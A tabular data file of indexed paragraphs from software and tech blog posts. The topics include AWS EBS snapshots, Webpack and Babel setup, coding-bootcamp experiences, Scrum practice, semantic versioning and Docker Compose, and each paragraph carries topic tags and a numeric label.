2382,"In the graph below you can see our journey through EBS snapshots. Before we took any cost cutting measures, EBS comprised about 70% of our daily AWS EC2 spending. When we introduced our first snapshot routine EBS costs fell to about 55% for volumes and 2% for snapshots. These savings came from snapshotting the volume that held the actual database information. Our second snapshot routine snapshots all volumes attached to an instance. This led to EBS volumes comprising 25% of our daily spend and 8% on snapshots.","['AWS', 'Technology', 'Cloud Computing', 'Development', 'Serverless']",10
2383,"Our Step Functions are chains of AWS Lambda functions that call the AWS EC2 API. These Step Functions shutdown an instance and convert its EBS volumes to snapshots. Looping is made possible by using the wait and choice states. Instead of waiting inside a Lambda function for a snapshot to complete we output the current status into the Step Function state. Then we check that output and verify that the action was successful. If the action failed then we wait for a period of time and loop back to the check status function. If it succeeded, we go to the next step in the workflow.","['AWS', 'Technology', 'Cloud Computing', 'Development', 'Serverless']",3
2384,"There are some drawbacks to this approach. First, there is a known performance degradation of volumes created from snapshots. When you create a new volume from a snapshot, AWS loads the blocks from S3 as the operating system requests them. This can degrade performance until the volume has received all its blocks from S3. Amazon has a recommended solution if this is a concern for you. Second, this approach increased startup and shutdown time. Typical EC2 startup and shutdown time is a few minutes. Our shutdown and startup process take about 7 minutes each way.","['AWS', 'Technology', 'Cloud Computing', 'Development', 'Serverless']",11
2385,"One thing to keep in mind when designing a Step Function is secure loop iteration. If you have an array of objects that need an action performed on them only once you need a secure way to do so. The pattern we follow is to: Have the actor Lambda function take in the array and an index value to act upon Actor Lambda performs work on that index element of the array Iterator Lambda increments the index after the actor Lambda completes Choice state completes the loop or sends it back to step 1 if there are more elements in the array This pattern allows you to handle a single array element failure instead of trying to reprocess the entire array. A great example is detaching volumes from an instance. If you have 2 volumes and only 1 detaches on the first call, Amazon will throw an error if you repeat the exact same call. We have identified several key API calls that need this pattern: Creating volumes Detaching volumes Attaching volumes Creating snapshots Amazon has a great example in the Step Function docs on how to do this. You can view our own Iterator lambda here and see it in action below.","['AWS', 'Technology', 'Cloud Computing', 'Development', 'Serverless']",3
2386,"The following sections detail the actions carried out to create this application. The application starts with the following tree: Step 1In the root folder of the application, we run the following command npm install --save-dev webpack webpack-cli. This will install the webpack which contains the code for the bundling operations and webpack-cli which provides the command line access for Webpack. We passed the option --save-dev to indicate that we want npm to save these packages as a development dependency in package.json Step 2Next since the Webpack packages are not installed into the global node_module, a simple modification is required for __url__ that will allow this to run the locally installed webpack-cli. This uses npx package that is available only from npm version 5.2.0 onwards. npx allows us to run the task npm run build which executes Webpack after adding a new property build: webpack to the scripts property in package.json. For npm version < 5.2.0 please refer to footnotes .","['JavaScript', 'Webpack', 'Babel', 'Browsers', 'ES6']",18
2387,"Step 3This step installs the minimal packages required for Babel 7 to work with Webpack for a web application. In the event, versions > then those in the article introduces breaking changes this article will be updated whenever possible. First run npm install --save-dev babel-loader @babel/core @babel/preset-env html-webpack-plugin script-ext-html-webpack-plugin in the terminal. The following packages will be installed as development dependencies since the packages will not be used in runtime. @babel/core This is the engine that will pick up all the configuration provided to run plugins to transpile the latest version of Java Script through syntax transformers into plain vanilla versions supported by the target platform. Notice that this uses@babel/ which means it is a scope package. @babel/preset-env This scope package is a Babel preset that compiles code down to ES5 by automatically determining the Babel plugins and polyfills needed based on the targeted browser or runtime environments. By default it behaves exactly the same as babel-preset-latest (or babel-preset-es2015, babel-preset-es2016, and babel-preset-es2017 together).babel-loader This is the Babel plugin for Webpack, it will be added to the Webpack configuration to instruct it to run the target files though Babel during the bundling process. Note that it is not using scope packages.html-webpack-plugin This is a Webpack plugin that allows as to bundle and process HTML files. It is not really required by the bare minimal setup but is helpful to get the HTML files into the distributionscript-ext-html-webpack-plugin This is a Webpack plugin which is not really required by the bare minimal setup as well. But it allows the automation of injecting the bundled javascript into the HTML files that is included in the distribution Step 4In this step the package to allow the Webpack configuration file to be written using ES6 is installed. Run npm install --save-dev @babel/register in the terminal. The following packages will be installed as development dependencies since the packages will not be used in runtime. @babel/register This scope package provides the require hook that will bind itself to nodes require and automatically compile files on the fly for Babel. Webpack uses js-interpret internally to call register the package as a module to transpile the Webpack configuration file for execution. It requires the file to be named with __url__ suffix to work.","['JavaScript', 'Webpack', 'Babel', 'Browsers', 'ES6']",18
2388,Step 5The final step creates the Webpack configuration file __url__ used to configure Webpack. The full details of the configuration file will not be covered here. But in short it gets the entry javascript file provided and processes it through the modules. It uses plugins to make sure the html is processed as well. The important thing to note is the file is named with a prefix webpack.config which is part of the default filename use by Webpack. It also uses the suffix __url__ that is used by js-interpret to identify configuration files that needs to be transpiled by Babel.,"['JavaScript', 'Webpack', 'Babel', 'Browsers', 'ES6']",7
2389,"Suggestions or fixes to the article to make it more useful for everyone will be welcomed. But the author is not doing this full time so response might take time. For npm version < 5.2.0, there is a choice of installing Webpack globally, use the full path in node_modules to the binary of Webpack installed or looking into the references provided in __url__ https://webpack.js.org/configuration/.","['JavaScript', 'Webpack', 'Babel', 'Browsers', 'ES6']",18
2390,"It has been one year since Ive graduated from the Deep Dive Coding Bootcamp. Earlier this week, I attended Demo Day, a recurring event where upcoming graduates present their capstone projects to the tech community and celebrate the end of the intensive 2.5 month program. This particular Demo Day was also special, as it was the 5th anniversary since the bootcamp started. As I watched the presentations and connected with new and old friends, it was a reflective evening for me in many ways. In a simple analysis, it has been one hell of a year. Below are my thoughts of my journey into becoming a software engineer.","['Programming', 'Software Engineering', 'Software Development', 'Codingbootcamp', 'Software']",2
2391,"In late 2016, I had stopped working as an energy efficiency analyst. I remember feeling very frustrated about my next steps, finding a new job, and if I would be 100% happy working as an energy efficiency analyst as a long-term career. I studied Sustainable Management at university and I knew I wanted to pursue a career that would align with my passion in climate resiliency (aka sustainability). However, I felt that working in a super niche part of that industry as energy efficiency would be difficult. I also came across articles (like this one) which reveal the inaccuracies and ineffectiveness of some energy modeling software. It is not reasonable to see building owners pay tens of thousands of dollars to energy engineers for an energy audit, energy model, and building retrofit and then only see poor results in energy savings. There are better ways to make a building more efficient, and the reality is that there are better solutions as technology is outpacing traditional models. Verdigris is one such company I admire, as they combine sensors and software to identify the root source of energy inefficiencies. More granular, detailed data is needed for something complicated as slashing a building or homes energy bill to $0/month. The more data points, the better.","['Programming', 'Software Engineering', 'Software Development', 'Codingbootcamp', 'Software']",2
2392,"Then in December 2016, I decided I wanted to level up in my skill set so I can directly contribute to the technical aspects of software for clean energy/sustainability solutions. I have heard of coding bootcamps and knew a few people who have taken them, but I did not know any Deep Dive alumni. I actually got accepted to a coding bootcamp in Denver before discovering Deep Dive. I thought moving to Denver for 56 months would be a great experience, as I miss living in a bigger city and Colorado is a great state for tech jobs, vegan food, running, and snowboarding. The deciding factor of why I chose Deep Dive over the Denver bootcamp was the time and financial costs. Deep Dives Fullstack program was 10 weeks and a few thousand dollars less than the Denver bootcamp. I also received a grant through Tech Hire New Mexico, a training program to help increase the tech industry in major New Mexico counties. I am fortunate to have received that grant, as it covered my tuition costs. I was going to commit to Deep Dive.","['Programming', 'Software Engineering', 'Software Development', 'Codingbootcamp', 'Software']",2
2393,"When you make a crazy decision such as enrolling in a 10 week coding bootcamp, there are negative reactions from all directions. From friends and family members getting concerned about me jumping into another career path, to sleepless nights where I reevaluate if this is the best decision, I know that I would have to make the choice in the end. As I have grown older, I think I have gotten better at not caring about what others think of me. Everyone has a different life path and if there was only one path to success, then our society would probably be very robotic and dull. The negative reactions, concerns, etc actually increased my motivation to take the coding bootcamp. I dont strive to receive negative feedback in general, but it is satisfying when you can prove the doubters wrong.","['Programming', 'Software Engineering', 'Software Development', 'Codingbootcamp', 'Software']",4
2394,"I remember the first week of the bootcamp, the instructor said that if the lecture material was being covered too fast or too much, then we can request a refund and attend typical semester-long Introduction to Computer Science courses. Although the first week was intensely filled with lecture, additional reading, and homework assignments, I enjoyed learning the new material. I only took one computer science course in undergrad (MATLAB) and one AP Computer Science class in high schoolneither of which made me more interested to learn more about coding. How does the first week of a coding bootcamp inject more curiosity within me to learn more? The beginning weeks consisted of learning fundamental programming concepts such as object-oriented programming (OOP), data structures, databases, regular expressions, security, etc. Then, we formed into our capstone project teams and started our individual portfolio website project. For my capstone project, my team and I built a Raspberry Pi Smart Mirror. It was built with PHP, My SQL, Angular, HTML, CSS, and Bootstrap (the main technologies taught in the Fullstack program). It was a very challenging project, but also fun because we were the only team in my cohort that got to build a software + hardware project. The portable mirror showed current weather (with animated icons! ), time, and notifications such as when your tea or snack was ready (Snack Bot: a separate PHP program) and Slack messages. We were also planning to integrate indoor air pollution sensors with the mirror, but the sensor had major defects and as a result, we had to remove that feature out of the project scope. For my individual website project, I built a personal portfolio consisting of my projects, resume, and a dynamic contact form.","['Programming', 'Software Engineering', 'Software Development', 'Codingbootcamp', 'Software']",2
2395,"As mentioned earlier, Demo Day is like the Showcase Showdown (I havent even watched The Price is Right in forever and I still remember that part). After 9.5 grueling weeks of class, lecture, homework, projects, and preparing for the job search, Demo Day was the evening to present your capstone project (and individual portfolio projects if you wanted) to a highly technical audience (employers, software engineers, web developers, etc). There were food, drinks, and plenty of networking as well. I was extremely nervous before it was my teams turn to present because I didnt want to forget what I was going to say. Fortunately, my part of the presentation went well and that was a huge relief. Overall, it was neat to present my capstone and individual projects! It was starting to look like the end of the bootcamp, finally! There were 2 more days until the actual graduation day where we had to present our projects again. That was more of an informal presentation since the audience was geared towards friends and family.","['Programming', 'Software Engineering', 'Software Development', 'Codingbootcamp', 'Software']",2
2396,"As the end of the internship was approaching, I was getting anxious about whether I would be promoted or not. Things can change very fast with project requirements, budget, and hiring. Then the last week before my internship arrived: I found out that I got promoted to a full-stack software developer. I was so happy and felt accomplished to have reached another milestone in my new software career. For the next several months, I continued working with the same great team, worked on more interesting features, and continued my quest of becoming a better, more proficient developer.","['Programming', 'Software Engineering', 'Software Development', 'Codingbootcamp', 'Software']",2
2397,"There are really 3 options to becoming a software engineer: 1) completing a traditional Computer Science program, 2) going the self-taught route, or 3) completing an intensive coding bootcamp. For me, the coding bootcamp made the most sense for me (and it did). It was not feasible for me time-wise or financially to take option 1. Option 2 probably wouldnt have worked well for me (at least starting from scratch) because I think I learn better in a structured, classroom environment where you can collaborate with others in person (especially with difficult programming concepts). Its also important to note that coding bootcamps are not for everyone. They are intense programs that require a lot of focus, commitment, and dedication. If you are interested in taking the coding bootcamp route like I did, then I highly recommend this article: Cracking the Coding Bootcamp.","['Programming', 'Software Engineering', 'Software Development', 'Codingbootcamp', 'Software']",2
2398,"I mainly worked individually with Dan and Sanjay. Dan was interested in the role of crowds in a data cleaning framework, and we ended up studying a mixture of modeling, systems, and active learning approaches to speed up crowd-based labeling tasks from minutes or hours to a few seconds. My main contribution was showing why powerpoint is a great tool for architecture diagrams, and creating an architecture that even Wimpy can use: Sanjay was working on the statistical side of data cleaning, and we often talked about what the point of data cleaning even is. From these conversations, we ended up thinking about how data cleaning would be different if we knew what the cleaned data would be used for. Active Clean was one of a series of projects studying the role of cleaning data for machine learning models. My main contribution was constantly being confused; to this day, were still trying to figure out what the point of data cleaning really is Jiannan was trying to get a job while I was at Berkeley, so he was busy on the road. However, one of the great outcomes of my postdoc is that we became friends and now collaborate on a bunch of projects! Testing Research Ideas Writing a thesis and giving a job talk forced me to manufacture a vision for my research, but it was still ill-formed. Before I graduated, Leilani Battle had helped me start making connections between database systems and data visualizations: namely that visualizations are essentially queries. I spent the 6 month postdoc testing two of the ideas that fall out of this observation.",[''],6
2399,"The first was trying to leverage human perceptual limitations to make query engines faster. For example, if the user cant perceive a few pixels of difference in a bar charts bar, then maybe we dont need to compute it exactly. Our idea was to quantify how poorly humans perceive data as it changes over time (e.g., dragging a slider continuously updates a chart), and find ways for the system to cheat. We called these Perceptual Functions (P-Funks), and a great Berkeley undergrad, Larry Xu, helped me run many user studies to quantify this, and we worked to submitting a visualization paper based on the study. After several years of rejections, we finally learned that the question is too difficult, because how human perception depends on so many factors relating to the context and individual. There are a huge number of proceeding studies needed before we can study what we originally intended.",[''],14
2400,"If full-Scrum isnt working, the team should ask themselves:1. Scrum thrives in a Goldilocks zone of requirement instability. Requirements should be stable enough for 23 sprints worth of functionality to be defined, but flexible enough to handle changing business needs. If the entire project is well-known to a T, estimation is either easy or unimportant, and stakeholders really wont change their mind (an incredibly rare occurrence if there ever was one), then Waterfall may be the way to go. Conversely, if at least one months worth of requirements cant be defined, or the team cant establish a predictable velocity (due to constant external dependencies, highly discovery-based work, etc.) then a Kanban or Scrumban approach may be preferred, and project schedules will have to be kept very rough.2. Scrum not only gives power to team, but also challenges them. Releasing genuine value up to every two weeks is hard, and even the smallest impediments can put that goal in doubt. Therefore the surrounding organization must be invested enough to care about the teams impediments, and agile enough to quickly remediate them. Beyond impediments, the team will consistently discover ways to work more effectively, and may require outside changes to execute them. An organization thats Agile enough to adapt for the team, while keeping everyone elses best interests in mind, will see their Scrum teams blossom. An organization that refuses to adapt its processes & structure will fail to produce, fail to innovate, and quickly become the next Kodak.3. The personal qualities needed to excel in Scrum are very different from those needed to survive the stereotypical corporate landscape. Courage, boldness, passion, and a desire to continuously improve are required from each member of the team. For some decades-long survivors of corporate, these traits have been stamped out and replaced by quietness and complacency. Although the newfound freedoms of Scrum may break some team members out of their shells, for others the responsibility of constantly delivering is daunting, compared to keeping their heads down and collecting paychecks. Consider whether your team members are able to make this shift, and whether Scrum can deliver enough quick-wins to bring even the most curmudgeonly of old-school people on board.","['Agile', 'Scrum', 'Scrum Agile', 'Scrum Master', 'Process Improvement']",1
2401,"If youre in management, you may be saying: It sure looks like my teams are using Scrum. I mean, theyre standing up daily! But are they really using Scrum, or are they just drawing burndown charts and holding new meetings, while keeping their waterfall-based approach to development? Are they practicing Scrum, or Scrummerfall? Symptoms of Scrummerfall are: Testers are bored out of their minds for 80% of the sprint, then have to work late the last few days to test every expected feature at once Sprints 0-* (0 to many) are used as design sprints These indicate a Waterfall mindset re-packaged as Scrum. What happens when a tester rejects a story 4 hours before the sprint ends? What happens when requirements drastically change, and those four design sprints are nullified? Scrummerfall exists because Waterfall is comforting, familiar, and easy to follow.","['Agile', 'Scrum', 'Scrum Agile', 'Scrum Master', 'Process Improvement']",1
2402,"Consider what happens when you start running. Your first non-stop mile seems impossible. Your efforts leave you gasping for air, with a rather dismal time. Your old life of a couch and bag of Lays beckons. But you keep putting those running shoes on every day, and over time that mile seems easier. Before long youre doing 2 miles, then 3 miles, then 10 miles Youve challenged your body through frequent running, and your body has adapted to these new demands, becoming stronger and leaner in the process.","['Agile', 'Scrum', 'Scrum Agile', 'Scrum Master', 'Process Improvement']",4
2403,"Transitioning to Scrum is like establishing a running routine. At first the idea of fully finishing functionality in two weeks seems nearly impossible. Team members balk at these new demands and frequent meetings, lamenting the easy days of Waterfall (while conveniently ignoring the months-late deliveries and misunderstood requirements). The first sprint ends with an underwhelming velocity and disheartened team. But the retro contains plenty of lessons-learned, and the team starts Sprint 2 with smaller user stories and a more accurate target velocity. Over time fewer stories are carried between sprints, and more user-ready functionality is demoed in sprint reviews. The team has been challenged to quickly deliver value, and with the help of a good Scrum Master theyve adapted their mindsets to meet these new demands. Theyre more cohesive, more communicative, and more motivated as a result.","['Agile', 'Scrum', 'Scrum Agile', 'Scrum Master', 'Process Improvement']",1
2404,"I knew this had to do with something involving keybindings. I opened up the preferences in Py Charm to start searching the existing key mappings. I thought maybe the defaults were colliding with something. So, I tried hitting the magic key combo Fwhile in another input. There was that damn rando string again! I cleared the field and hit F again. This time, I paid attention to what the menu was doing with the key combo. I saw it highlight as if applying something while my favorite string popped into the Keymap input again. So, I opened the menu and started scouring each menu for that magical combination. I went through all of them and they were almost all grayed out, except the root Py Charm menu.","['Productivity', 'Intellij', 'Rubymine', 'Keyboard Shortcuts', 'Openpgp']",3
2405,"Here are a few approaches that Ive seen being adopted with varying degrees of success Case by case decisions: Involve negotiation between product and engineering leadership on how much of the upcoming effort will be devoted to new feature development vs. paying down technical debt or shoring up the architecture or increasing the resilience of the technology stack. This is not always the most comfortable of conversations: product feels that the engineering team hasnt done their job properly and is putting product goals in jeopardy to clean up their mess. Meanwhile, tech feels that product is not prioritizing technical resilience. Not surprisingly, this conversation often devolves into negative territory. The negativity can be mitigated through a strong and trusting relationship between the product and engineering leaders.","['Technical Debt', 'Product', 'Product Management', 'Engineering', 'Collaboration']",12
2406,"Today, I am going to show you how to manage Terraform configuration with Git Lab CI in minutes, for free! If youve been looking for ways to manage Terraform, youve likely come across Atlantis; Which works by attaching to a git repository and commenting the output of terraform plan on your merge/pull requests. This seems to be one of the best approaches. That is until you realize it requires you to use a webhook. Not that webhooks are a bad thing in general, but if your source control exists outside of your private network (lets say on Git H __url__ or Git Lab.com) then your webhook URL has to be open to the public. Of course, you can filter traffic in many ways, such as whitelists Its just more than you need to do, especially if you are already using Git Lab! Heres what you need to do to create a workflow like Atlantis using Git Lab CICreate a private repository for your Terraform configuration on your Git Lab server. If you dont have one, you can use Git L __url__ (its free). If your Terraform configuration is already on a Git Lab server, good for you! Either way, there are only two more steps! The next step is to add some Environment Variables to your Git Lab settings in your project. In your projects sidebar go to Settings > CI/CD and click Expand next to Environment Variables.","['Gitlab', 'Terraform', 'Ci', 'DevOps', 'Infrastructure As Code']",7
2407,"Honestly, the best way to do it is to just install Linux (Fedora or Ubuntu) at home and use that as much as you can. You will break things, you will get stuck and then you will have to fix it all and in the process, you will learn Linux! For reference, in North America, the Red Hat variants are more prevalent. Therefore, it makes sense to start with Fedora or Cent OS. If you are wondering whether you should get the KDE or Gnome edition, get KDE. :)Python: the dominant back-end language these days. Easy to get started with, widely used. Bonus: Python is very prevalent in the AI/Machine Learning space, so if you ever want to transition to yet another hot field, youll be all set! Amazon Web Services: Once again, it is impossible to become a seasoned Dev Ops professional without a solid understanding of how a public cloud works. And if knowledge of a cloud is what you are after, Amazon Web Services is the dominant player in this space, offering the richest set of tools to work with.","['DevOps', 'AWS', 'Linux', 'Python', 'Training']",18
2408,"There are some other changes that make life easier that I have implemented since the last time I wrote the configuration. First is disabling security for local development, on line 6. This removes the login part of Jenkins and has the bonus of not having to look up the admin password every time. I have also increased the default Agent resources, line 52. There was an issue with Kubernetes terminating the pod once the limits of the Agent resources were reached and failing builds. This was fixed by increasing the limits.","['Kubernetes', 'Jenkins', 'DevOps', 'Pipeline', 'Docker']",7
2409,"I was invited by Tom Suter to discuss my blog post about scaling the Sprint Review. After two hours we did indeed discuss this article, but I also got lots of inspiration in return. In this blog post Ill share the pictures Ive taken today and a video theyve create earlier. It gives you an impression of the awesome Agile journey Kramp is making. What I really like is their feedback-driven approach. They use lots of creative visualisations that offer the transparency. Transparency that enables the necessary inspection and adaptation.","['Agile', 'Scrum']",6
2410,Every x seconds the burndown chart of a different team is shown. Numbers written on paper are attached on the screen. The team can win or loose points when the burndown chart touches the numbers written down on the paper. Obviously the team with the best burndown chart gains the most points and will win the precious Burndown Bingo Trophy. This really is a great way to make visualising the progress of a Sprint fun! Tom brought a book to my attention about Scrum. More specifically about the Scrum Master. The strange part was I didnt know book! So when I arrived at home I immediately ordered the book at Amazone.,"['Agile', 'Scrum']",6
2411,"Playing Lean simulates the experience of launching a successful product into a board game that can be played in 90 minutes. Along the way, players will learn the core concepts and vocabulary of the Lean Startup. And they will remember it because they have experienced it. This is how the related website explains the game. At Kramp theyve played the game with some enthusiastic colleagues. I think Ill order a copy for myself as well. I know quite a few Product Owners that would appreciate this game.","['Agile', 'Scrum']",6
2412,"Another cool game that Ive ordered immediately. Iterative, Incremental, Big Bang is a workshop game to encourage people to think about alternative approaches for tackling projects. However, rather than discuss boring work-like scenarios, were asking you to decide on an approach for everyday scenarios like converting your loft, cooking Sunday lunch or building a nuclear submarine! Kramp is gathering feedback in many different ways. Currently theyre also doing an experiment that measures happiness. When leaving the office, people can point out if they had a great or bad day. The results and possible improvements are discussed periodically. By now it shouldnt surprise you that Ive pushed the green button.","['Agile', 'Scrum']",5
2413,"Essentially, Agile is a set of principles and practices for software development that emphasize: Individuals and interactions over processes and tools Working software over comprehensive documentation Customer collaboration over contract negotiation Responding to change over following a plan1Why does it matter to be Agile? In my experience and understanding, to deliver software that matters, which caters to a need and is thereby valuable to the customer. But isnt that the objective of any project that is worth building? I havent come across teams having discussions on how to produce something which is practically useless. Yet, even though starting with right intentions, processes and tools many projects inevitably ran into roadblocks and software crisis with waterfall model commonly used for the development.",['Agile'],12
2414,"A Patch release is used to signify that the code changes in this revision has not added any new features or API changes and is backward compatible with the previous version. It is most typically used to signify a bug fix. The most important thing to know is that the code has not changed the way it is used. Using the lodash example above, if a new patch revision is sent out then the version would be 4.17.12A Minor release is used to signify that functionality has been added, but the code is otherwise backward compatible. Keeping with the lodash example, if a new function is added or a new optional parameter is added to an existing function then the version would be 4.18.0. The most important thing to remember is that this added functionality is optional and by upgrading to this version should not require code changes on the part of the user When you make changes to the public API and the code is no longer backward compatible, then you have made breaking changes. This requires a major revision increase. This can mean a feature was removed or functionality has changed that requires the user to make changes to the code to accept the update. Using the same example, a major release would by 5.0.0Things are slightly different if the Major version is a zero. A zero Major version number indicates that the software is in rapid development and does not have a stable API. This also means each minor increase can have breaking changes. An example of this is React Native which is currently on version 0.57.8 This means that to upgrade to version 57 from 56 may require code changes and may not be compatible with other dependencies in the project. Patch updates should still be considered backward compatible After reading all this you might be thinking, I dont plan on publishing a library or an npm package. First of all, I highly recommend you publish a package. You will learn a lot by going through the process. Secondly, as a developer who brings in these libraries and packages, its important to keep them up to date and this versioning system helps make decisions to update your dependencies not just easier to make, but automated.","['JavaScript', 'Software Engineering', 'Semantic Versioning', 'Software Development', 'Programming']",18
2415,"This convention allows your package manager to make smart decisions for you. If I was to clone the above project and run npm install. I would not get react version 16.6.3, I would get version 16.7.0 instead. This is because 16.7.0 is still backward compatible with 16.6.3, but is more up to date with the latest patches and features. When you run npm update, it does not just install the latest backward compatible version according to your rules, it also bumps the version number in your __url__ as well. When you run npm audit -fix, this tells npm to run npm update on those packages that have known security issues so you can get the latest patches. If the fix is in a version that doesnt fit your rules of comfort, it will let you know you need to fix it manually.","['JavaScript', 'Software Engineering', 'Semantic Versioning', 'Software Development', 'Programming']",18
2416,"Not solving the right thing or just no need Too eager to release a feature or offering and skipping validation with actual people The bigger picture no longer works e.g. feature bloat (hence testing in context)Too little too lateyour competitor is doing it better / faster / cheaper etc. Microsoft Zune vs i Pod Not enough research resulting in a problem If research was done: Not tested enough Tested in the wrong part of the product dev lifecycle e.g. usability testing instead of demand testing Heres an interesting analysis of why Starbucks failed in Australia: Cost of building Customer dissatisfaction / losing customers or conversions Brand impact Loss of money or budget not met Cost to diagnose and fix problem PR problems Security or legal problems Customer support costs Cost of building Release problems when a feature is sitting there (big releases = more risk of things going wrong and having to spend time fixing release-related issues)Its no longer relevant, falling behind competitors or was launched too late and youve lost market share Other dependencies waiting on that feature Which Ive not focussed on in this write-up. Many of us have the peace of mind of working on products where failure doesnt impose a safety risk on people. The high-risk end of the spectrum includes emergency and medical products: the cost of failure is too high.","['Product Management', 'Product Development', 'User Research', 'Product Design']",13
2417,"Im assuming the software itself was tested to a very high grade. But the error was not with the softwares accuracy. Could more research within the broader context have helped with this to recommend more training prior to the crash? Everything we do prior to launch is a way to build confidence and some of these activities can only build so much confidence e.g. user testing is a great way to make sure things are working right, but it wont be the same as releasing a feature live. It also tells you about usability, but wont tell you about demand. Hopefully youre amongst a culture that understands that building confidence is not the same as a contract that promises 100% success.","['Product Management', 'Product Development', 'User Research', 'Product Design']",13
2418,"Having proper diagnostic and data tools e.g. Decibel, Google Analytics and some hypotheses about what youre expecting to see and why Input from your customer services team Betas / closed-group studies Launching a newer version of a UI alongside the old version and allowing people to opt-in to the newer version. This can be especially useful when users are really used to an interface and a sudden change could have a big impact on their tasks. It also helps you track adoption and plan when to switch off the old version Dashboards with KPIs so the whole team can self-serve and are bought-in: I really believe the whole team, not just the Product Manager and Designer, should have visibility and care about the performance of the product. Its everyones contribution that drives outcomes. Also, this is an important point because there are some metrics that arent feature-specific e.g.","['Product Management', 'Product Development', 'User Research', 'Product Design']",0
2419,"Make sure test is the right fidelity for what you need to find out (e.g. there are times when your prototype is too hi-fi and this can actually be a detriment to collecting data)Safe-to-fail plan i.e. if something fails, whats the backup plan? Reprioritise so theres time to tweak? This might be one particularly for times when you were happy to take more of a risk to save validation time up-front, so the outcome might be less predictable The first time I heard about safe-to-fail plans was through the talk below by Liz Keogh. It has a huge amount of food for thought, I really recommend it. She goes into a lot of depth about how being prepared for the unexpected frees you to do more experimenting.","['Product Management', 'Product Development', 'User Research', 'Product Design']",13
2420,"Are your stakeholders on board with the agile process so that if you do learn and need to respond to that, they understand this is what sometimes happens with the leaner approach and that you cant necessarily just move onto another feature? This is a whole other topic in itself about organisational culture and team structure Consider the entire journey of using the productsomeone might fly through a form in usability testing but there might be repercussions later in the experience e.g. How do you marry up the full journey data? Make sure youre testing the full journey, not just a page in isolation. They experience the entire organisation end-to-end. And if you uncover something thats impacting the experience and not directly in your control, e.g. you should make a case to the people who can, to change that for the better.","['Product Management', 'Product Development', 'User Research', 'Product Design']",1
2421,"Sense & Respond is also an amazing book about continuously learning, its a great read. As described by Amazon: Risks in releasing too early vs too late How much confidence do you need to release? How you are going to build confidence prior to release? What is your safe-to-fail plan for post-release? letting users opt-in to a new beta version of your product Are you using the right activities for what you need to find out? What gaps are there in diagnostic tools that need to be fixed regardless of this release? Does the culture around you empower you to experiment and learn and understand that just because you have confidence, doesnt mean this is a guarantee that everything will be 100% successful. But gaining more and more confidence also has a detrimental impact on how quickly you are getting something out there. Its a balance Also dont forget that the research and validation shouldnt stop just because somethings released! IRONY: Am I ready to publish? Not 100% ready but realised I am ready enough that I want to get this out there and see what feedback I get. My release plan for an article is normally: get feedback from people kind enough to read my draft via the draft link, then soft-launch the article and then if I feel ok about it share on social media.","['Product Management', 'Product Development', 'User Research', 'Product Design']",4
2422,"Learn more: Top 5 Free API Testing Tools While the response status code tells the status of the request, the response body content is what an API returns with the given input. An API response content varies from data types to sizes. The responses can be in plain text, a JSON data structure, an XML document, and more. They can be a simple few-word string (even empty), or a hundred-page JSON/XML file. Hence, it is essential to choose a suitable verification method for a given API. Katalon Studio has provided rich libraries to verify different data types using matching, regular expression, Json Path, and Xml Path.","['API', 'Software Development', 'Programming', 'Testing', 'Continuous Integration']",15
2423,"API testing flow is quite simple with three main steps: Send the request with necessary input data Get the response having output data Verify that the response returned as expected in the requirement The most touch parts of API testing are not either sending request nor receiving the response. They are test data management and verification. It is common that testing a few first APIs such as login, query some resources, etc. The testing task becomes more and more difficult to further APIs. Therefore, API testing task is easy to be underestimated. At some point in time, you would find yourself in the middle of choosing a good approach for test data and verification method. It is because the returned data have similar structures, but not the same in a testing project. It will be difficult to decide if you should verify the JSON/XML data key by key, or using object mapping to leverage the power of programming language.","['API', 'Software Development', 'Programming', 'Testing', 'Continuous Integration']",13
2424,"Perhaps, you have a suite of on premise applications that vary in need for resources and you anticipate the need to spike during holiday seasons or other events. Since you dont have the resources on premise you spin up a Kubernetes cluster with cloud vendor X. You could use Cloudflare Load Balancer in front of your on premise and cloud Kubernetes deployments. This would allow you to migrate to the cloud from on premise in a more seamless manner. You could move your on premises services in phases and cut over to multiple clouds and wind down your data center resources. Or you could use it to experiment with a certain cloud vendor. Kubernetes portability and compliance affords you less work for deployments and cloud vendor specific knowledge.","['Docker', 'Kubernetes', 'Azure', 'Google Cloud Platform', 'AWS']",11
2425,"Before experimenting with Multi Cloud K8S, I used to pitch the idea of using multiple clouds for resiliency and more often than not I was countered with AWS has X many Regions and Availability Zones. But what if it failed for some reason. Do your applications need to run because it would cost your organization money if it didnt? Do lives depend on your applications running? Do you like to sleep well at night? In my limited experience, software and hardware fails for all kinds of reasons. From simple mistakes, no renewing an SSL certificate to switches routers just dying. Hard drives, they fail all the time. Expecting failure and thinking about what and how things can fail is a mindset. When I started building microservices, I read Production Ready Microservices, discusses resiliency on all levels. I started asking questions of my tech stack. On one project, I found out early that a large suite of applications I was supporting ran on 6 virtual machines. Then I found out all 6 VMs were on the same physical hardware. So, if that hardware went downyeah. I then learned about affinity rules.","['Docker', 'Kubernetes', 'Azure', 'Google Cloud Platform', 'AWS']",11
2426,"There may be forces that are not technical in nature that may lead you to choose a cloud vendor. You can take the portable K8s deployments and leave a cloud vendor. Setting up Cloudflare Load Balancing even with one cloud can make it easy to switch over to another cloud vendor. Reasons for moving off of a vendors cloud: too expensive, legal rules that affect where data can be stored, or wanting to go green with another vendor,Kubernetes is not applicable to every type of application. It make make perfect sense to use AWS Lambdas for aspects of your software environment. You may find it better to use Google App Engine for the performance review app that is only used one month a year since it can scale to zero. You will have to determine how and when and if it makes sense to use a multi cloud approach in migrating to the cloud, staying in the cloud, or getting ahead in the cloud.","['Docker', 'Kubernetes', 'Azure', 'Google Cloud Platform', 'AWS']",11
2427,"For some of your services, you may not need to build from a custom Dockerfile and a public image on Docker Hub will suffice. You can instruct Compose to pull from Docker Hub by declaring:image: ""<repository_name>:<tag>""For example, our database service pulls the public image of Postgres running on Alpine Linux by having this declared:image: ""postgres:alpine""However, in most cases, you would likely have custom Dockerfiles to build an image from and this will require specifying a build context. This defines the path which the compose file will look at to build the service image. This path must contain the Dockerfile. Here are some common ways to define build contexts: Tip 1: Building from a remote location is undoubtedly slower than building from a location on disk, so if your developers have already cloned the repo beforehand, then its better to build from a path. However, using a Git URL is especially useful for CI build scripts! Tip 2: You can achieve lean images by minimising the number of build layers. You can use Dive to help you do this. It analyzes a Docker image by studying how its contents are being changed over the build process with every addition of an image layer.","['Docker', 'Docker Compose', 'Containers', 'DevOps', 'Software Development']",7
